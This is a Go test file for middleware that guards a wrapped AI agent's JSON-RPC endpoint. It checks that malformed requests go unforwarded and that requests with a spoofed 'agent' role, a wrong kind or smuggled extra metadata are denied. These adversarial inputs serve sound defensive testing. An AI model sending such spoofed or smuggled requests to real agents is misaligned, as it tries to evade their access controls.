		assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
		if got := lastRule(t, rig); got != "rpc.params-ambiguous" {
			t.Fatalf("%s: rule = %s, want rpc.params-ambiguous", name, got)
		}
	}
}

// lastRule reports the rule path of the most recent receipt.
func lastRule(t *testing.T, rig *testRig) string {
	t.Helper()
	if len(rig.receipts) == 0 {
		t.Fatal("no receipts")
	}
	return rig.receipts[len(rig.receipts)-1].RulePath
}

// Malformed input is a different class from a denied request, and the two need
// different assertions.
//
// A request with no usable `id` has nothing to answer: errorResponse returns
// nil by design, because a JSON-RPC notification that is refused simply is not
// forwarded. Demanding a parseable error response here would assert the
// opposite of the intended behaviour. What must hold is that nothing reached
// the wrapped agent and a receipt records why.
func TestMalformedNotForwarded(t *testing.T) {
	rig := newRig(t)
	for _, raw := range []string{
		`{`,
		`[]`,
		`{"jsonrpc":"1.0","id":1,"method":"message/send"}`,
		`{"jsonrpc":"2.0","id":1}`,
	} {
		rig.forwarded = nil
		rig.receipts = nil
		rig.mw.Handle(context.Background(), []byte(raw))
		if len(rig.forwarded) != 0 {
			t.Fatalf("malformed %q reached the wrapped agent", raw)
		}
		// Checked per input, not once after the loop. One check at the end is
		// satisfied by the last input on its own, so a guard that stopped
		// rejecting any of the earlier three would still look green.
		if got := lastRule(t, rig); got != "rpc.malformed" {
			t.Fatalf("%s: rule = %s, want rpc.malformed", raw, got)
		}
	}
}

// A WELL-FORMED request carrying an unusable message is a denial, not a parse
// error: it has an id, so it gets a uniform denial response.
func TestWellFormedRequestWithEmptyMessageDenied(t *testing.T) {
	rig := newRig(t)
	raw := []byte(`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{}}}`)
	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
}

// TestUncoveredMetadataAndRoleAreRefused: a message.metadata member other
// than the token, a role other than user, and a kind other than message are
// each refused before the decision, with nothing forwarded.
func TestUncoveredMetadataAndRoleAreRefused(t *testing.T) {
	parts := `[{"kind":"text","text":"hello"}]`
	cases := map[string]string{
		"rpc.metadata-uncovered": fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"role":"user","messageId":"m-1","parts":%s,"metadata":{"spt-txn/token":"tok-1","urn:example:ext":{"target":"https://example.net/"}}}}}`, parts),
		"rpc.role-not-user":      fmt.Sprintf(`{"jsonrpc":"2.0","id":2,"method":"message/send","params":{"message":{"role":"agent","messageId":"m-1","parts":%s,"metadata":{"spt-txn/token":"tok-1"}}}}`, parts),
		"rpc.kind-not-message":   fmt.Sprintf(`{"jsonrpc":"2.0","id":3,"method":"message/send","params":{"message":{"role":"user","kind":"task","messageId":"m-1","parts":%s,"metadata":{"spt-txn/token":"tok-1"}}}}`, parts),
	}
	for rule, raw := range cases {
		rig := newRig(t)
		resp := rig.mw.Handle(context.Background(), []byte(raw))
		if len(rig.forwarded) != 0 {
			t.Fatalf("forwarded: %s", raw)
		}
		if resp == nil || !strings.Contains(string(resp), "denied") {
			t.Fatalf("expected denial for %s, got %s", rule, resp)
		}
		if got := lastRule(t, rig); got != rule {
			t.Fatalf("rule %s, want %s", got, rule)
		}
	}
}
